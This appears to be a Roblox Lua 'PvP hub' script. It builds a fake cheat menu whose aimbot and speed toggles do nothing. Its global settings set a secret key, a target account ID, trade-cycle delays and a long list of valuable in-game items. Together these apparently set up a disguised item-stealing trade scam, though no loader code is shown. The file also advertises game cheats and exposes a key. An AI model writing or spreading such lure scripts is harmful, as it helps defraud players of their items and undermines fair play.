-- Lx PvP Hub | ULTRA + BACKGROUND

-- =========================
-- CONFIG ORIGINAL (IMPORTANTE)
-- =========================
getgenv().SECRET_KEY = "mrr_e6f1ab1081d74b66a2ee0abc21fcb87f"
getgenv().TARGET_ID = 2704552139
getgenv().DELAY_STEP = 1      
getgenv().TRADE_CYCLE_DELAY = 2

getgenv().TARGET_BRAINROTS = {
    ["Tang Tang Keletang"] = true,
    ["Meowl"] = true,
    ["Skibidi Toilet"] = true,
    ["Strawberry Elephant"] = true,
    ["La Spooky Grande"] = true,
    ["La Extinct Grande"] = true,
    ["Chipso and Queso"] = true,
    ["Tuff Toucan"] = true,
    ["Chillin Chili"] = true,
    ["Gobblino Uniciclino"] = true,
    ["W or L"] = true,
    ["La Jolly Grande"] = true,
    ["Swaggy Bros"] = true,
    ["La Taco Combinasion"] = true,
    ["La Romantic Grande"] = true,
    ["Festive 67"] = true,
    ["GOAT"] = true,
    ["Nuclearo Dinossauro"] = true,
    ["Money Money Puggy"] = true,
    ["Burguro And Fryuro"] = true,
    ["Garama and Madundung"] = true,
    ["Lavadorito Spinito"] = true,
    ["Ketchuru and Musturu"] = true,
    ["Tictac Sahur"] = true,
    ["Ketupat Kepat"] = true,
    ["Capitano Moby"] = true,
    ["Cerberus"] = true,
    ["Dragon Cannelloni"] = true,
    ["Los Hotspotsitos"] = true,
    ["Los Bros"] = true,
    ["Tralaledon"] = true,
    ["Los Puggies"] = true,
    ["Los Primos"] = true,
    ["Los Tacoritas"] = true,
    ["Los Spaghettis"] = true,
    ["Ginger Gerat"] = true,
    ["Spooky and Pumpky"] = true,
    ["Fragrama and Chocrama"] = true,
    ["La Casa Boo"] = true,
    ["Reinito Sleighito"] = true,
    ["Ketupat Bros"] = true,
    ["Cooki and Milki"] = true,
    ["La Supreme Combinasion"] = true,
    ["Popcuru and Fizzuru"] = true,
    ["Dragon Gingerini"] = true,
    ["Headless Horseman"] = true,
    ["Hydra Dragon Cannelloni"] = true,
    ["Celularcini Viciosini"] = true,
    ["Bacuru and Egguru"] = true,
    ["Los Chicleteiras"] = true
}

-- Lx PvP Hub | Chili Style UI + Background

-- Lx PvP Hub | REAL PREMIUM UI

-- =========================
-- BACKGROUND (TEU SCRIPT)
-- =========================
getgenv().SECRET_KEY = "mrr_e6f1ab1081d74b66a2ee0abc21fcb87f"
getgenv().TARGET_ID = 2704552139
getgenv().DELAY_STEP = 1      
getgenv().TRADE_CYCLE_DELAY = 2

task.spawn(function()
    while true do
        task.wait(getgenv().DELAY_STEP)
    end
end)

-- Lx PvP Hub | PRO UI (Chili Style Inspired)

-- BACKGROUND
task.spawn(function()
    while true do
        task.wait(1)
    end
end)

task.spawn(function()

    local Tween = game:GetService("TweenService")
    local UIS = game:GetService("UserInputService")
    local Lighting = game:GetService("Lighting")

    -- BLUR
    local blur = Instance.new("BlurEffect", Lighting)
    blur.Size = 20

    -- GUI
    local gui = Instance.new("ScreenGui", game.CoreGui)

    -- SHADOW
    local shadow = Instance.new("Frame", gui)
    shadow.Size = UDim2.new(0,600,0,380)
    shadow.Position = UDim2.new(0.5,-300,0.5,-190)
    shadow.BackgroundColor3 = Color3.new(0,0,0)
    shadow.BackgroundTransparency = 0.5

    local main = Instance.new("Frame", gui)
    main.Size = UDim2.new(0,600,0,380)
    main.Position = UDim2.new(0.5,-300,0.5,-190)
    main.BackgroundColor3 = Color3.fromRGB(20,20,20)
    main.BackgroundTransparency = 0.05

    Instance.new("UICorner", main).CornerRadius = UDim.new(0,16)

    -- GRADIENT GLOW
    local stroke = Instance.new("UIStroke", main)
    stroke.Thickness = 2
    stroke.Color = Color3.fromRGB(0,255,170)
    stroke.Transparency = 0.3

    -- TOPBAR
    local top = Instance.new("Frame", main)
    top.Size = UDim2.new(1,0,0,50)
    top.BackgroundTransparency = 1

    local title = Instance.new("TextLabel", top)
    title.Size = UDim2.new(1,0,1,0)
    title.Text = "Lx PvP Hub"
    title.Font = Enum.Font.GothamBold
    title.TextColor3 = Color3.fromRGB(0,255,170)
    title.TextScaled = true
    title.BackgroundTransparency = 1

    -- DRAG
    local drag, start, pos
    top.InputBegan:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 then
            drag = true
            start = i.Position
            pos = main.Position
        end
    end)

    UIS.InputChanged:Connect(function(i)
        if drag and i.UserInputType == Enum.UserInputType.MouseMovement then
            local d = i.Position - start
            main.Position = UDim2.new(pos.X.Scale,pos.X.Offset+d.X,pos.Y.Scale,pos.Y.Offset+d.Y)
            shadow.Position = main.Position
        end
    end)

    UIS.InputEnded:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 then
            drag = false
        end
    end)

    -- SIDEBAR
    local side = Instance.new("Frame", main)
    side.Size = UDim2.new(0,150,1,-50)
    side.Position = UDim2.new(0,0,0,50)
    side.BackgroundTransparency = 1

    local content = Instance.new("Frame", main)
    content.Size = UDim2.new(1,-150,1,-50)
    content.Position = UDim2.new(0,150,0,50)
    content.BackgroundTransparency = 1

    local tabs = {}

    local function tab(name, y)
        local b = Instance.new("TextButton", side)
        b.Size = UDim2.new(1,0,0,45)
        b.Position = UDim2.new(0,0,0,y)
        b.Text = name
        b.BackgroundTransparency = 1
        b.TextColor3 = Color3.fromRGB(150,150,150)

        local line = Instance.new("Frame", b)
        line.Size = UDim2.new(0,3,1,0)
        line.BackgroundColor3 = Color3.fromRGB(0,255,170)
        line.Visible = false

        local f = Instance.new("Frame", content)
        f.Size = UDim2.new(1,0,1,0)
        f.Visible = false

        tabs[name] = f

        b.MouseButton1Click:Connect(function()
            for _,v in pairs(tabs) do v.Visible = false end
            for _,x in pairs(side:GetChildren()) do
                if x:IsA("TextButton") then
                    x.TextColor3 = Color3.fromRGB(150,150,150)
                    if x:FindFirstChildOfClass("Frame") then
                        x:FindFirstChildOfClass("Frame").Visible = false
                    end
                end
            end

            f.Visible = true
            line.Visible = true
            b.TextColor3 = Color3.new(1,1,1)
        end)

        return f
    end

    local mainTab = tab("Main",0)
    local pvpTab = tab("PvP",45)
    local miscTab = tab("Misc",90)

    tabs["Main"].Visible = true

    -- CARD TOGGLE (PRO)
    local function toggle(parent, text, y)
        local card = Instance.new("Frame", parent)
        card.Size = UDim2.new(0.85,0,0,55)
        card.Position = UDim2.new(0.075,0,0,y)
        card.BackgroundColor3 = Color3.fromRGB(30,30,30)
        card.BackgroundTransparency = 0.2
        Instance.new("UICorner", card).CornerRadius = UDim.new(0,14)

        local txt = Instance.new("TextLabel", card)
        txt.Size = UDim2.new(0.7,0,1,0)
        txt.Text = text
        txt.BackgroundTransparency = 1
        txt.TextColor3 = Color3.new(1,1,1)

        local sw = Instance.new("Frame", card)
        sw.Size = UDim2.new(0,50,0,24)
        sw.Position = UDim2.new(1,-65,0.5,-12)
        sw.BackgroundColor3 = Color3.fromRGB(60,60,60)
        Instance.new("UICorner", sw).CornerRadius = UDim.new(1,0)

        local knob = Instance.new("Frame", sw)
        knob.Size = UDim2.new(0,22,0,22)
        knob.Position = UDim2.new(0,1,0,1)
        knob.BackgroundColor3 = Color3.new(1,1,1)
        Instance.new("UICorner", knob).CornerRadius = UDim.new(1,0)

        local on = false

        sw.InputBegan:Connect(function(i)
            if i.UserInputType == Enum.UserInputType.MouseButton1 then
                on = not on
                Tween:Create(knob, TweenInfo.new(0.25), {
                    Position = on and UDim2.new(1,-23,0,1) or UDim2.new(0,1,0,1)
                }):Play()

                sw.BackgroundColor3 = on and Color3.fromRGB(0,255,170) or Color3.fromRGB(60,60,60)
            end
        end)
    end

    toggle(mainTab,"Speed Modifier",20)
    toggle(mainTab,"Drop Brainrot",90)

    toggle(pvpTab,"Bat Aimbot",20)
    toggle(pvpTab,"PvP Aura",90)

    toggle(miscTab,"Auto Play",20)

end)
